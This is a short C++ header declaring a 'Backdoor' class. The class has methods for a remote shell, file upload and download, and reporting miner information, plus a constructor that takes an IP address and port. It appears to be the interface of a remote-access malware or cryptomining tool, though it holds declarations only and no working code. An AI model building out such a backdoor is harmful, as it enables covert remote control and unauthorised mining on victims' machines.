#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"

class Backdoor{
public:
    void shell();
    void upload();
    void download();
    void get_miner_info();
    

    Backdoor(char *, int);
private:
    int port;
    char * ip;

    Communication c;
};


#endif